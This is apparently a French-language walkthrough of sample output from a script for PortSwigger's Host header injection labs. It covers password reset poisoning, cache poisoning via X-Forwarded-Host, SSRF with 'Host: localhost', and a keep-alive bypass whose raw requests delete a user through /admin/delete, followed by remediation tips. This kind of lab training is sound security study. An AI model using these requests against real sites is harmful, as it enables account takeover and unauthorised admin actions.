# MANPAGE 

Voici un **exemple exhaustif de l’exécution du script** pour les challenges HTTP Host headers de PortSwigger, illustrant chaque étape (analyse, attaque, contrôle) et le comportement attendu pour chaque type de lab :

---

### 1. Analyse du comportement du Host header

```
------------------------------------------------------
[Analyse] Test du comportement du Host header
  [!] Redirection basée sur Host détectée :
Location: https://evil.com/
```
**Explication** :  
Le script envoie une requête avec un Host header malicieux (`Host: evil.com`).  
Il détecte ici une redirection basée sur la valeur du Host, ce qui indique un comportement vulnérable ou une logique d’URL dynamique (voir[1][2]).

---

### 2. Attaque : Password reset poisoning via Host header

```
------------------------------------------------------
[Attaque] Password reset poisoning via Host header
- Envoi d'une requête de reset avec Host: exploit-<your-lab>.exploit-server.net
  [Contrôle] : Vérifiez les logs de l'exploit server pour la présence d'un lien de reset.
```
**Explication** :  
Le script simule une demande de réinitialisation de mot de passe avec un Host contrôlé par l’attaquant.  
Dans les labs PortSwigger, cela permet de vérifier si le lien envoyé à la victime pointe vers l’exploit server, ce qui confirme la vulnérabilité (voir[7]).

---

### 3. Attaque : Cache poisoning via Host/X-Forwarded-Host

```
------------------------------------------------------
[Attaque] Cache poisoning via Host/X-Forwarded-Host
  [Contrôle] : Ouvrez le tracking.js depuis un navigateur, ou attendez qu'un utilisateur visite la page. Vérifiez si une requête est faite à l'exploit server.
```
**Explication** :  
Le script envoie une requête avec un header `X-Forwarded-Host` pointant vers l’exploit server.  
Si le cache du serveur est empoisonné, un utilisateur ou un crawler peut charger un script ou une ressource contenant le domaine de l’attaquant (voir[3][7]).

---

### 4. Attaque : SSRF via Host header (host routing)

```
------------------------------------------------------
[Attaque] SSRF via Host header (host routing)
- Envoi d'une requête avec Host: localhost
  [-] Accès admin non obtenu.
```
**Explication** :  
Le script tente d’accéder à une ressource interne (`/admin`) en modifiant le Host header à `localhost`.  
Si la réponse contient des éléments d’admin, la vulnérabilité SSRF est confirmée (voir[2][6][8]).  
Ici, l’accès échoue ; dans un cas réussi, on verrait :  
```
  [+] Accès admin obtenu via SSRF Host header !
```

---

### 5. Attaque : Host validation bypass via connection state (keep-alive)

```
------------------------------------------------------
[Attaque] Host validation bypass via connection state (keep-alive)
- Cette attaque nécessite un outil bas niveau (netcat, ncat, ou Burp Repeater en mode raw).
- Exemple de requêtes à chaîner sur la même connexion :
GET / HTTP/1.1
Host: https://<your-lab>.web-security-academy.net
Cookie: session=<your-session-cookie>
Connection: keep-alive

POST /admin/delete HTTP/1.1
Host: localhost
Cookie: session=<your-session-cookie>
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=CSRF_TOKEN&username=carlos
  [Contrôle] : Vérifiez si la suppression admin fonctionne malgré la validation Host.
```
**Explication** :  
Le script fournit un exemple de requêtes à chaîner sur la même connexion TCP pour bypasser la validation du Host header.  
Ce scénario est typique des labs avancés sur le Host header authentication bypass (voir[5][7]).

---

### 6. Conseils/remédiation

```
------------------------------------------------------
[Remédiation & Conseils]
- Ne faites confiance qu'au premier Host header reçu et validez-le strictement côté serveur.
- Ignorez ou filtrez les headers X-Forwarded-Host, X-Host, X-Forwarded-Server sauf configuration explicite.
- Ne générez jamais d'URL dynamiquement à partir du Host header sans validation.
- Pour les labs PortSwigger, vérifiez la propagation du Host dans les liens de reset, scripts, ou redirections.
- Documentation PortSwigger : https://portswigger.net/web-security/host-header
```
**Explication** :  
Le script rappelle les bonnes pratiques de sécurité, en lien avec la documentation officielle PortSwigger (voir[1]).

---

### 7. Synthèse

```
------------------------------------------------------
[SYNTHÈSE]
1. Analyse du comportement du Host header.
2. Attaques : password reset poisoning, cache poisoning, SSRF, host validation bypass.
3. Contrôle : vérification des logs exploit server, du cache, ou de l'accès admin.
4. Application des recommandations de sécurité.
------------------------------------------------------
```
